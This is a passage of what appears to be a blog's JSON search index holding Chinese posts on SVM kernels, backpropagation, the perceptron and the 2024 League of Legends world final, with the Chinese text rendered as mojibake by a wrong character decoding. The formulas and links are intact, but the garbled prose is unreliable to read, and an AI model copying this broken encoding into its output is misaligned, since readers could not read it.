¸å‡½æ•° $$ K(x_i, x_j) = \\exp(-\\gamma||x_i - x_j|| ^ 2) $$ sigmoid æ ¸å‡½æ•° $$ K(x_i, x_j) = \\tanh(\\gamma x ^ \\top x_j + b) $$ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:3:1","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å‚è€ƒ ç»Ÿè®¡å­¦ä¹ æ–¹æ³•(ç¬¬2ç‰ˆ)æèˆª https://zhuanlan.zhihu.com/p/77750026 https://zhuanlan.zhihu.com/p/38163970 https://zhuanlan.zhihu.com/p/55532322 https://zhuanlan.zhihu.com/p/261061617 https://zhuanlan.zhihu.com/p/480302399 https://blog.csdn.net/qq_25018077/article/details/139541976 ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:4:0","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ¨¡å‹ æ¨¡å‹ç”±å¤šå±‚æ„ŸçŸ¥æœºæ„æˆï¼Œæ¯å±‚æœ‰è‹¥å¹²ä¸ªç¥ç»å…ƒï¼Œç¬¬ä¸€å±‚æ˜¯è¾“å…¥å±‚ï¼Œæœ€åä¸€å±‚æ˜¯è¾“å‡ºå±‚ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º å…¶ä¸­è¾“å…¥å±‚è¡¨ç¤ºè¾“å…¥æ•°æ®çš„è‹¥å¹²ä¸ªç‰¹å¾ è®°ä¸º $x_1, x_2, \\cdots, x_n$ï¼Œè¾“å‡ºå±‚è¡¨ç¤ºåˆ†ç±»çš„æ¦‚ç‡ã€‚ ","date":"2024-11-10","objectID":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/:1:0","tags":["ç¥ç»ç½‘ç»œ"],"title":"å‰é¦ˆç¥ç»ç½‘ç»œ","uri":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"ç¥ç»å…ƒ æ¯ä¸ªèŠ‚ç‚¹å°±æ˜¯ä¸€ä¸ªç¥ç»å…ƒï¼Œä»å›¾ä¸­ä¸éš¾å‘ç°ä¸Šä¸€å±‚çš„æ¯ä¸ªç¥ç»å…ƒéƒ½æœ‰ä¸€æ¡è¾¹è¿å‘è¯¥ç¥ç»å…ƒï¼Œå…¶ä¸­è¾¹æœ‰è¾¹æƒ $w$ å®šä¹‰ $w ^ l_{jk}$ ä¸ºç¬¬ $l-1$ å±‚çš„ç¬¬ $k$ ä¸ªç¥ç»å…ƒå’Œç¬¬ $l$ å±‚çš„ç¬¬ $j$ ä¸ªç¥ç»å…ƒè¿æ¥å¯¹åº”çš„æƒé‡ ($l - 1$ å±‚è¡¨ç¤ºä»–å·¦è¾¹çš„å±‚) å®šä¹‰ $z^l_j$ ä¸ºç¬¬ $l$ å±‚ç¬¬ $j$ ä¸ªç¥ç»å…ƒçš„æœªæ¿€æ´»å€¼(åŠ æƒè®¡ç®—å€¼)ã€‚ å®šä¹‰ $a^l_j$ ä¸ºç¬¬ $l$ å±‚ç¬¬ $j$ ä¸ªç¥ç»å…ƒçš„æ¿€æ´»å€¼ã€‚ å®šä¹‰ $b^l_j$ ä¸ºç¬¬ $l$ å±‚ç¬¬ $j$ ä¸ªç¥ç»å…ƒå¸¦æœ‰çš„åç½®ã€‚ å…¶ä¸­ $$ z_j^l = \\sum\\limits_k w_{jk} ^ l a_k ^ {l - 1} + b_j ^ l \\\\ a_j^l=\\sigma(z_j^l) $$ $\\sigma(x)$ ä»£è¡¨ sigmoid å‡½æ•°ï¼Œ$k$ ä¸‹æ ‡æ±‚å’ŒèŒƒå›´ä¸º $l$ å±‚ç¥ç»å…ƒä¸ªæ•°ã€‚ ç›´è§‚æ¥è®²å°±æ˜¯è¯¥ç¥ç»å…ƒçš„å€¼æ˜¯ä¸Šä¸€å±‚æ¯ä¸ªç¥ç»å…ƒçš„å€¼ä¹˜ä»¥åˆ°ä»–çš„è¾¹æƒï¼Œç´¯åŠ èµ·æ¥å†åŠ ä¸Šä¸€ä¸ªè¯¥ç¥ç»å…ƒå¸¦çš„åç½®ï¼Œæœ€åå¥—ä¸€ä¸ª sigmoid å‡½æ•°ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆè¦å¥— sigmoidï¼Ÿå› ä¸ºçº¿æ€§ç»„åˆå¦‚æœå åŠ åœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆå§‹ç»ˆå¯ä»¥ç”¨ä¸€ä¸ªå¼å­æ¥è¡¨è¾¾ï¼Œå°±ç”¨ä¸ç€å¤šå±‚ç½‘ç»œäº†ï¼Œæ‰€ä»¥è¦å¼•å…¥ä¸€ä¸ªéçº¿æ€§çš„å¤åˆï¼Œå¹¶ä¸”ï¼Œsigmoid å¯ä»¥è®©æ•°æ®å½’ä¸€åŒ–ï¼Œå§‹ç»ˆåœ¨ $(0, 1)$ ä¹‹é—´ã€‚å½“ç„¶ ReLU ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ ","date":"2024-11-10","objectID":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/:1:1","tags":["ç¥ç»ç½‘ç»œ"],"title":"å‰é¦ˆç¥ç»ç½‘ç»œ","uri":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æŸå¤±å‡½æ•° å®šä¹‰ $y_j$ è¡¨ç¤ºè¾“å‡ºå±‚ç¬¬ $j$ ä¸ªè¾“å‡ºçš„çœŸå®å€¼ã€‚ è€ƒè™‘ç”¨ MSE (å‡æ–¹è¯¯å·®) æ¥ä½œä¸ºæŸå¤±å‡½æ•° $C$ $$ C = \\frac{1}{2}\\sum_{k}(y_k - a_k ^ l) ^ 2 $$ ","date":"2024-11-10","objectID":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/:1:2","tags":["ç¥ç»ç½‘ç»œ"],"title":"å‰é¦ˆç¥ç»ç½‘ç»œ","uri":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"åå‘ä¼ æ’­ ç°åœ¨è€ƒè™‘æœ€å°åŒ–æŸå¤±å‡½æ•°ï¼Œä¸€èˆ¬æ¥è¯´éƒ½æ˜¯æ¢¯åº¦ä¸‹é™ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦è°ƒæ•´æ•´ä¸ªç½‘ç»œä¸­çš„ $w, b$ æ¥ä½¿æŸå¤±å‡½æ•°æœ€å°åŒ–ï¼Œè¿™æ ·ä¸å¥½è®¡ç®—ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œè®­ç»ƒè¿‡ç¨‹å°±æ˜¯è¦è®©æ¨¡å‹çš„é¢„æµ‹ $a^l_j$ è¶Šæ¥è¿‘çœŸå®å€¼ $y_j$ è¶Šå¥½ã€‚é‚£ä¹ˆ $a^l_j$ è·Ÿä»€ä¹ˆæœ‰å…³å‘¢ï¼Ÿæ ¹æ®æ ·æœ¬çš„çœŸå®å€¼ $y_j$ï¼Œå¯ä»¥è®¡ç®— $a^l_j$ å’Œ $y_j$ çš„è¯¯å·®ï¼Œè®¡ç®—å‡ºè¯¯å·®ä¹‹åï¼Œæˆ‘ä»¬è‚¯å®šçŸ¥é“è¦å¢å¤§è¿˜æ˜¯å‡å° $a^l_j$ æ‰èƒ½è®©æ¨¡å‹çš„é¢„æµ‹æ›´å¥½ã€‚è€Œæˆ‘ä»¬èƒ½å¤Ÿæ”¹å˜çš„é‡åªæœ‰ï¼šç¬¬ $l - 1$ å±‚å’Œç¬¬ $l$ å±‚ä¹‹é—´çš„æ¯ä¸ªæƒé‡ $w^l_{jk}$ï¼Œåç½®é¡¹ $b_j^l$ï¼Œæˆ–è€…æ˜¯ç¬¬ $l-1$ å±‚çš„æ¿€æ´»å‡½æ•°çš„è¾“å‡ºå€¼ $a^{l-1}_k$ï¼Œä½†æ˜¯ $a_k^{l-1}$ å¹¶æ— æ³•ç›´æ¥æ”¹å˜ï¼Œå®ƒæ˜¯ç”±æ›´å‰é¢çš„æƒé‡å’Œåç½®é¡¹çš„å€¼å†³å®šçš„ã€‚å½“æˆ‘ä»¬ä»åå¾€å‰æ ¹æ®é¢„æµ‹çš„è¯¯å·®ï¼Œè€ƒè™‘è¦å¦‚ä½•ä¿®æ”¹æ¯ä¸€å±‚çš„æƒé‡å’Œåç½®é¡¹çš„æ—¶å€™ï¼Œå°±æ˜¯åœ¨åšåå‘ä¼ æ’­ã€‚ ä¸Šè¿°è¿‡ç¨‹è§£é‡Šäº† $a_j^l$ æƒ³è¦å¦‚ä½•è°ƒæ•´æ¨¡å‹çš„æƒé‡å’Œåç½®é¡¹ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è€ƒè™‘è¾“å‡ºå±‚ä¸­é™¤äº†$a_j^l$ ä»¥å¤–çš„ç¥ç»å…ƒçš„â€œæ„è§â€ã€‚ä»–ä»¬å„è‡ªå¯¹å¦‚ä½•æ”¹å˜æ¨¡å‹çš„æƒé‡å’Œåç½®é¡¹çš„â€œæ„è§â€å¹¶ä¸ä¸€å®šç›¸åŒã€‚æœ€åï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘è¾“å‡ºå±‚ä¸­æ‰€æœ‰ç¥ç»å…ƒçš„æ„è§æ¥æ›´æ–°æ¨¡å‹çš„æƒé‡å’Œåå·®ã€‚ å››ä¸ªåŸºæœ¬å…¬å¼ æˆ‘ä»¬å¸Œæœ›èƒ½å¾—åˆ°ä»»æ„çš„ $\\dfrac{\\partial C}{\\partial w_{jk}}, \\dfrac{\\partial C}{\\partial b^l_j}$ åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå®šä¹‰å‡ ä¸ªä¸œè¥¿ã€‚ å…¬å¼ 1 å®šä¹‰ $\\delta^l_j \\equiv \\dfrac{\\partial C}{\\partial z^l_j}$ é‚£ä¹ˆæœ‰ $$ \\begin{aligned} \\delta_j^l \u0026= \\frac{\\partial C}{\\partial z_j^l} \\\\ \u0026= \\frac{\\partial C}{\\partial a_j^l} \\frac{\\partial a_j^l}{\\partial z_j^l} \\\\ \u0026= \\frac{\\partial C}{\\partial a_j^l} \\frac{\\partial \\sigma(z_j^l)}{\\partial z_j^l} \\\\ \u0026= \\frac{\\partial C}{\\partial a_j^l}\\sigma ' (z_j^l) \\end{aligned} $$ ç„¶å $\\dfrac{\\partial C}{\\partial a^l_j} = (y_j - a^l_j)$ï¼Œæ‰€ä»¥ $\\delta_j^l = (y_j - a^l_j)\\sigma ' (z_j^l)$ é‚£ä¹ˆ $l$ å±‚çš„ $\\delta$ ç”¨çŸ©é˜µè¡¨ç¤ºï¼š $$ \\delta ^ l = \\begin{bmatrix} \\frac{\\partial C}{\\partial a_1^l}\\sigma ' (z_1^l) \\\\ \\frac{\\partial C}{\\partial a_2^l}\\sigma ' (z_2^l) \\\\ \\vdots \\\\ \\frac{\\partial C}{\\partial a_k^l}\\sigma ' (z_k^l) \\\\ \\end{bmatrix} = \\begin{bmatrix} \\frac{\\partial C}{\\partial a_1^l} \\\\ \\frac{\\partial C}{\\partial a_2^l} \\\\ \\vdots \\\\ \\frac{\\partial C}{\\partial a_k^l} \\\\ \\end{bmatrix} \\odot \\begin{bmatrix} \\sigma ' (z_1^l) \\\\ \\sigma ' (z_2^l) \\\\ \\vdots \\\\ \\sigma ' (z_k^l) \\\\ \\end{bmatrix} = \\nabla C_{a^l} \\odot \\sigma ' (z^l) $$ å…¶ä¸­ $\\odot$ è¡¨ç¤ºæŒ‰å…ƒç´  (element-wise) ä¹˜ã€‚ å…¬å¼ 2 ç»§ç»­å¯¹äº $l - 1$ å±‚è¿›è¡Œæ¨å¯¼ã€‚ $$ \\begin{aligned} \\delta_j^{l - 1} \u0026= \\frac{\\partial C}{\\partial z_j^{l - 1}} \\\\ \u0026= \\frac{\\partial C}{\\partial a_j^{l - 1}} \\frac{\\partial a_j^{l - 1}}{\\partial z_j^{l - 1}} \\\\ \u0026= \\frac{\\partial C}{\\partial a_j^{l - 1}} \\frac{\\partial \\sigma(z_j^{l - 1})}{\\partial z_j^{l - 1}} \\\\ \u0026= \\frac{\\partial C}{\\partial a_j^{l - 1}} \\sigma ' (z_j^{l - 1}) \\end{aligned} $$ å‘ç°æ­¤æ—¶ $\\dfrac{\\partial C}{\\partial a_j^{l - 1}}$ ä¸å¥½æ±‚äº†ï¼Œä½†æˆ‘ä»¬çŸ¥é“ $a_j^{l - 1}$ å’Œ $z_j^l$ éƒ½æœ‰å…³ã€‚ æ‹¿ $a^{l - 1}_1$ ä¸¾ä¾‹å­ï¼Œå¦‚ä¸‹å›¾ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆæŠŠ $C$ çœ‹æˆ $z^l_1, z^l_2, \\cdots, z^l_k$ çš„å¤åˆå‡½æ•°ã€‚ $$ \\begin{aligned} \\frac{\\partial C}{\\partial a_1^{l - 1}} \u0026= \\frac{\\partial C(z^l_1, z^l_2, \\cdots, z^l_k)}{\\partial a_1^{l - 1}} \\\\ \u0026= \\sum_k \\frac{\\partial C}{\\partial z^l_k} \\frac{\\partial z^l_k}{\\partial a_1^{l - 1}} \\end{aligned} $$ ç”±äº $z_j^l = \\sum\\limits_k w_{jk} ^ l a_k ^ {l - 1} + b_j ^ l$ï¼Œæ‰€ä»¥ $\\dfrac{\\partial z^l_k}{\\partial a_1^{l - 1}} = w_{k1} ^ l$ åˆæ ¹æ®å…¬å¼ 1 çš„å®šä¹‰ $\\delta^l_j \\equiv \\dfrac{\\partial C}{\\partial z^l_j}$ï¼Œå°†ä¸¤ä¸ªå¼å­å¸¦å…¥ä¸Šè¿°æ±‚å’Œå…¬å¼å¾—ï¼š $$ \\sum_k \\frac{\\partial C}{\\partial z^l_k} \\frac{\\partial z^l_k}{\\partial a_1^{l - 1}} = \\sum_k w^l_{k1}\\delta_k^l $$ åŒç†ï¼Œå¯¹äºå…¶ä»–çš„ $a^{l - 1}_{j}$ï¼Œéƒ½æœ‰ï¼š $$ \\frac{\\partial C}{\\partial a_j^{l - 1}} = \\sum_k w^l_{kj}\\delta_k^l $$ æ‰€ä»¥è¯´ï¼Œ$\\delta_j^{l - 1} = \\dfrac{\\partial C}{\\partial a_j^{l - 1}} \\sigma ' (z_j^{l - 1}) = \\left(\\sum\\limits_k w^l_{kj}\\delta_k^l \\right) \\times \\sigma ' (z_j^{l - 1})$ æ¨å¹¿åˆ°çŸ©é˜µå½¢å¼ï¼Œå³å¯¹ $l$ å±‚æ‰€æœ‰ $\\delta ^ l$ (å±‚æ•°ä¸‹æ ‡å…ˆå¹³ç§»ä¸€å±‚)ï¼š $$ \\delta ^ l = \\begin{bmatrix} \\left(\\sum\\limits_k w^{l + 1}_{k1} \\delta^{l + 1}_k \\right) \\times \\sigma ' (z_1^l) \\\\ \\left(\\sum\\limits_k w^{l + 1}_{k2} \\delta^{l + 1}_k \\right) \\times \\sigma ' (z_2^l) \\\\ \\vdots \\\\ \\left(\\sum\\limits_k w^{l + 1}_{kn} \\delta^{l + 1}_k \\right) \\times \\sigma ' (z_n^l) \\\\ \\end{bmatrix} = ((w^{l+1})^\\top \\delta^{l+1})\\odot \\sigma ' (z^l) $$ å…¬å¼ 3 å¥½äº†ç°åœ¨ç»ˆäºå¯ä»¥è§£å†³ $w, b$ çš„åå¯¼é—®é¢˜äº† $$ \\begin{aligned} \\frac{\\partial C}{\\partial b^l_j} \u0026= \\frac{\\partial C}{\\partial z^l_j} \\frac{\\partial z^l_j}{\\partial b^l_j} \\\\ \u0026= \\frac{\\partial C}{\\partial z^l_j} \\\\ \u0026= \\delta^l_j \\end{aligned} $$ ç”±äº $z_j^l = \\sum\\limits_k w_{jk} ^ l a_k ^ {l - 1} + b_j ^ l$ï¼Œæ‰€ä»¥ $\\dfrac{\\partial z^l_j}{\\partial b^l_j} = 1$ å…¬å¼ 4 $$ \\begin{aligned} \\frac{\\partial C}{\\partial w_{jk}^l}\u0026=\\frac{\\partial C}{\\partial z^l_j}\\frac{\\partial z^l_j}{\\partial w_{jk}^l} \\\\ \u0026=\\frac{\\partial C}{\\part","date":"2024-11-10","objectID":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/:1:3","tags":["ç¥ç»ç½‘ç»œ"],"title":"å‰é¦ˆç¥ç»ç½‘ç»œ","uri":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å‚è€ƒ https://martinlwx.github.io/zh-cn/backpropagation-tutorial/ https://zhuanlan.zhihu.com/p/683499770 https://playground.tensorflow.org/ ","date":"2024-11-10","objectID":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/:2:0","tags":["ç¥ç»ç½‘ç»œ"],"title":"å‰é¦ˆç¥ç»ç½‘ç»œ","uri":"/posts/ml%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"categories":["æ¸¸æˆ"],"content":"è™½ç„¶æˆ‘è‹±é›„è”ç›Ÿåªå…¥å‘äº†åŠå¹´ï¼Œå³¡è°·ä¹Ÿåªæœ‰ç™½é“¶æ°´å¹³ï¼Œä»Šå¹´ä¹Ÿåˆšå¼€å§‹çœ‹è‹±é›„è”ç›Ÿæ¯”èµ›ï¼Œä½†è¿™æ¬¡æ€»å†³èµ›æˆ‘èƒ½æ„Ÿå—åˆ° LPL è§‚ä¼—å¯¹äºè¿™æ¬¡å¯„å¸Œæœ›äºå…¨åç­å¤ºå† çš„åšé‡æ„Ÿã€‚ä»Šå¹´ä»æ˜¥å­£èµ›çœ‹åˆ°ä¸–ç•Œèµ›ï¼Œä¹Ÿçœ‹åˆ°äº† BLG çš„ä¸€è·¯åŠªåŠ›ï¼Œä»æ˜¥å­£èµ›å¤ºå† åˆ° MSI å‡»è´¥ T1 ä½†æƒ¨è´¥ GENGï¼Œå¤å­£èµ›è°ƒæ•´ç»§ç»­å¤ºå† ï¼Œå†åˆ°ä¸–ç•Œèµ›ç‘å£«è½®å‰æœŸè¶ŠæŒ«è¶Šå‹‡ æœ€åå‡»è´¥ G2 æˆåŠŸæ™‹çº§å…«å¼ºï¼Œæ·˜æ±°èµ›æ¨ªæ‰« HLEï¼Œåœ¨å››å¼ºæ‰¿æ¥ç€ WBG æ„å¿—èµ°å‘å†³èµ›ï¼Œç›®çš„å°±æ˜¯åœ¨æ€»å†³èµ›çš„èˆå°ä¸Šå¤§æ”¾å¼‚å½©ã€‚ ä¸ºæ­¤æˆ‘å‡†å¤‡å»ç”µå½±é™¢ç»™ BLG åŠ æ²¹åŠ©å¨ï¼Œç°åœºè§‚ä¼—éƒ½éå¸¸æ¿€æƒ…ï¼Œå› ä¸ºæˆ‘ä»¬æ¸´æœ›æœ‰ä¸€æ”¯å…¨åç­é˜Ÿä¼å¯ä»¥è·å¾—ä¸€ä¸ª S å† ï¼Œè™½ç„¶ LPL åœ¨ S8ï¼ŒS9ï¼ŒS11 éƒ½è·å¾—è¿‡å† å†›ï¼Œä½†æ˜¯æˆ‘ä»¬å¿…é¡»å‘å…¨ä¸–ç•Œè¯æ˜äº”ä¸ªä¸­å›½äººä¹Ÿæ˜¯å¯ä»¥å¤ºå† çš„ï¼Œè®©ä¸–ç•Œå¬åˆ°æˆ‘ä»¬çš„å£°éŸ³ï¼Œè¿™ä¹Ÿæ˜¯ç»§æ‰¿ 4045 å¤©ä»¥å‰å…¨åç­è¿›å…¥å†³èµ›çš„çš‡æ—æˆ˜é˜Ÿçš„å¢æœ¬ä¼Ÿã€Uziã€tabeã€ç¥è¶…ã€Lucky çš„æ„å¿—ï¼Œå¼¥è¡¥ä»–ä»¬çš„é—æ†¾ï¼Œæ‰€ä»¥æ­¤åˆ»å¥–æ¯å°±åœ¨çœ¼å‰ï¼Œäº”ä½é€‰æ‰‹å¿…é¡»è¦è€ƒè™‘è¿™æ˜¯å¦æ˜¯ä»–ä»¬æ­¤ç”Ÿä»…æœ‰çš„æœºä¼šã€‚ æ¯”èµ›ç¬¬ä¸€å°å±€ï¼ŒBLG æ‰“å‡ºå·¨å¤§ä¼˜åŠ¿ï¼Œæœ€ç»ˆä»¥ 18:3 æ‹¿ä¸‹ç¬¬ä¸€å°å±€ï¼Œå£«æ°”å¤§å¢ï¼Œåœºå†…è§‚ä¼—çš„æŒå£°å’Œå‘å–Šå£°ä¹Ÿæ­¤èµ·å½¼ä¼ã€‚ ç¬¬äºŒå°å±€å‰æœŸåŒæ ·ä¹Ÿæ‰“å‡ºå¾ˆå¤§ä¼˜åŠ¿ï¼Œ8 åˆ†é’Ÿè¢« T1 æ‰¾åˆ°æœºä¼šè¶Šå¡”åŒæ€ï¼ŒåæœŸå¤§é¾™å›¢åˆè¢« faker æ‰“å´©ï¼Œæ­¤æ—¶æ¯”èµ›å·²ç»åŸºæœ¬æ— æœ›ï¼Œæœ€åè¢« T1 æ‹¿ä¸‹ä¸€å±€ã€‚ ç¬¬ä¸‰å°å±€ BLG åˆæ‹¿åˆ°å·¨å¤§ä¼˜åŠ¿ï¼Œé€‰æ‰‹å‡ºè‰²å‘æŒ¥ä¸‹ 17:3 ç»ˆç»“ç¬¬ä¸‰å°å±€ã€‚ æ¥åˆ°æœ€å…³é”®çš„ç¬¬å››å±€ï¼Œæ­¤æ—¶æˆ‘ä»¬åªéœ€è¦å†èµ¢ä¸‹è¿™å±€å°±å¯ä»¥å¤ºå† äº†ï¼Œå‰æœŸ BLG åˆæ‹¿ä¸‹ä¼˜åŠ¿ï¼Œå¯æƒœåˆè¢« T1 æ‰¾åˆ°æœºä¼šæŠŠèŠ‚å¥æ‰“å›æ¥äº†ï¼Œèµ„æºæ›´æ˜¯ä¸€ä¸ªéƒ½æ²¡æœ‰æ§åˆ°ã€‚æœ€åè¢« faker å¡æ‹‰æ–¯ç»ˆç»“æ‰æ¯”èµ›ã€‚ æ­¤æ—¶æ¯”èµ›å·²ç»æ¥åˆ°äº† 2:2 çš„ç™½çƒ­åŒ–é˜¶æ®µï¼Œä¸¤ä¸ªé˜Ÿéƒ½ç¦»å† å†›åªæœ‰ä¸€æ­¥ä¹‹é¥ã€‚åœ¨å¦‚æ­¤å…³é”®çš„ç¬¬äº”å°å±€ï¼Œå‰æœŸ BLG æŠ“æ‰ faker æ‰“å‡ºä¼˜åŠ¿ï¼Œ10 åˆ†é’Ÿå†æ¬¡èµ·èŠ‚å¥ä»¤å·¦æ‰‹æ‹¿åˆ°ä¸¤ä¸ªäººå¤´ï¼Œç„¶åæ¯”èµ›æ¥åˆ° 28 åˆ†é’Ÿï¼Œæ²³é“å¼€å›¢ Xun æ‰“å‡º Guma éœçš„é—ªç°éšåè¢« Bin æŠ“æ‰ï¼Œéšå keria ä¹Ÿå€’ä¸‹ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¸€åº¦è®¤ä¸ºé‚£ä¸ªæ¢¦æƒ³ç»ˆäºè¦å®ç°äº†ï¼Œä½†æ˜¯æ­¤æ—¶æœ€å…³é”®çš„ä¸€å¹•å‘ç”Ÿäº†ï¼šå·¦æ‰‹é—ªç° E ç©ºæ‰ï¼Œæƒ³ç»§ç»­è¿½å‡»ï¼Œé‚£ä¹ˆ Bin åˆ™ TP ç»•åï¼Œä½†æ­¤æ—¶ faker å’Œ Zeus èµ¶åˆ°ï¼ŒåŠ é‡Œå¥¥çš„ä¸€ä¸ªé—ªç°å˜²è®½æ§ä½äº†å·¦æ‰‹å’Œ Xunï¼Œæ­¤æ—¶é…’æ¡¶ä¹Ÿè·Ÿä¸Šäº†ä¼¤å®³ï¼ŒBin å°±ä½ä½†ä¸ºæ—¶å·²æ™šï¼ŒELK æ›´æ˜¯éš¾ä»¥æ“ä½œäº¤å‡ºæ­»äº¡é—ªï¼Œè¿™ä¸€æ³¢è¢« faker æ“ä½œå›¢ç­ã€‚T1 æ‹¿å®Œå¤§é¾™åä¸Šè·¯è¯•å›¾å¼€å›¢ Zeusï¼Œæ­¤æ—¶ faker åŠæ—¶æ”¯æ´ï¼ŒZeus æ­»æ‰å faker å†æ®‹è¡€é‡‘èº«ç­‰é˜Ÿå‹æ”¯æ´ï¼Œåœ¨ BLG ä¸‰äººæ®‹è¡€çš„æƒ…å†µä¸‹ä¹Ÿæ²¡èƒ½æ”¶æ‰æœ‰ä¸€ä¸è¡€é‡çš„ fakerï¼Œè®©è§£è¯´ä¸ç¦æ„Ÿå¹åˆ°è¿™å°±æ˜¯ä¸æ­»é­”ç‹ fakerã€‚å¯èƒ½ä¹Ÿè¿™å°±æ˜¯å‘½è¿å§ï¼Œfaker ä¸€ä¸è¡€çš„é€ƒè·‘åœ¨å‘Šè¯‰ç€æˆ‘ä»¬ï¼šå³ä½¿æˆ‘è€äº†ï¼Œè¿˜æœ‰ä¸€å£æ°”ï¼Œä¹Ÿä¸ä¼šå€’åœ¨ LPL æ‰‹ä¸‹ã€‚ éšç€ BLG åŸºåœ°çš„çˆ†ç‚¸ï¼Œç°åœºçš„è§‚ä¼—ä¹Ÿéš¾ä»¥æ¥å—è¿™ä¸€å¹•ï¼Œå¤§å®¶ä¹Ÿçœ‹ç€è§å¹•ä¸Š T1 æ§èµ·å¥–æ¯çš„ç”»é¢æ²‰é»˜ç¦»åœºã€‚åœ¨å‡Œæ™¨ä¸‰ç‚¹åŠç¦»å¼€ç”µå½±é™¢çš„è·¯ä¸Šï¼Œå……æ»¡ç€ LPL è§‚ä¼—çš„è½å¯ï¼Œå¤§å®¶çš„å¿ƒæƒ…ä¹Ÿä¹…ä¹…æ— æ³•å¹³å¤ï¼Œå…¨åç­å¤ºå† éš¾é“è¿˜æ˜¯åšä¸åˆ°å—ï¼Œæˆ‘ä»¬å¿…é¡»è¦è·¨è¿‡è¿™ä¸ªæœ€é«˜çš„å±±ã€æœ€é•¿çš„æ²³ï¼Œå°±åƒç‹å¤šå¤šè¯´çš„é‚£å¥è¯—ä¸€æ ·ï¼šæµ·åˆ°æ— è¾¹å¤©ä½œå²¸ï¼Œå±±ç™»ç»é¡¶æˆ‘ä¸ºå³°ã€‚åªèƒ½å¸Œæœ›ä¸‹ä¸ªèµ›å­£ LPL åŠ æ²¹å§ï¼ŒS15 å†è§ï¼ ","date":"2024-11-02","objectID":"/posts/game%E8%8B%B1%E9%9B%84%E8%81%94%E7%9B%9F-s14-%E6%80%BB%E5%86%B3%E8%B5%9B/:0:0","tags":["å°ä½œæ–‡"],"title":"2024 è‹±é›„è”ç›Ÿ S14 å…¨çƒæ€»å†³èµ› è§‚èµ›æ„Ÿæ‚Ÿ","uri":"/posts/game%E8%8B%B1%E9%9B%84%E8%81%94%E7%9B%9F-s14-%E6%80%BB%E5%86%B3%E8%B5%9B/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ„ŸçŸ¥æœº ","date":"2024-10-29","objectID":"/posts/ml%E6%84%9F%E7%9F%A5%E6%9C%BA/:1:0","tags":["æ„ŸçŸ¥æœº"],"title":"æ„ŸçŸ¥æœº","uri":"/posts/ml%E6%84%9F%E7%9F%A5%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ¨¡å‹ è®¾è¾“å…¥çš„ç‰¹å¾å‘é‡ä¸º $X \\subseteq \\textbf{R}^n$ï¼Œæ¯ä¸ªå‘é‡å¯¹åº”è¾“å‡º $Y = {1, -1}$ï¼Œä¹Ÿå°±æ˜¯ä¸¤ç§åˆ†ç±»ã€‚ è®¾å‡½æ•° $f(x) = \\text{sign}(w \\cdot x + b)$ ç§°ä¸ºæ„ŸçŸ¥æœºï¼Œå…¶ä¸­ $w \\in \\textbf{R}^n$ è¡¨ç¤ºä¸€ç»„æƒå€¼ï¼Œ$b \\in \\textbf{R}$ å«åšåç½®ï¼Œ$\\cdot$ è¡¨ç¤ºå‘é‡ç‚¹ä¹˜ (å†…ç§¯)ã€‚$\\text{sign}$ æ˜¯ç¬¦å·å‡½æ•°å¦‚ä¸‹ï¼š $$ \\text{sign}(x) = \\begin{cases} 1,\u0026x \\ge 0 \\\\ -1, \u0026x \u003c 0 \\end{cases} $$ é€šè¿‡æ„ŸçŸ¥æœºçš„å­¦ä¹ ï¼Œå¾—åˆ°æ–¹ç¨‹ $w \\cdot x + b = 0$ï¼Œè¡¨ç¤ºä¸€ä¸ª $\\textbf{R}^n$ ç©ºé—´çš„è¶…å¹³é¢ï¼Œå°†ç‰¹å¾å‘é‡åˆ’åˆ†ä¸ºä¸¤ç±»ã€‚ 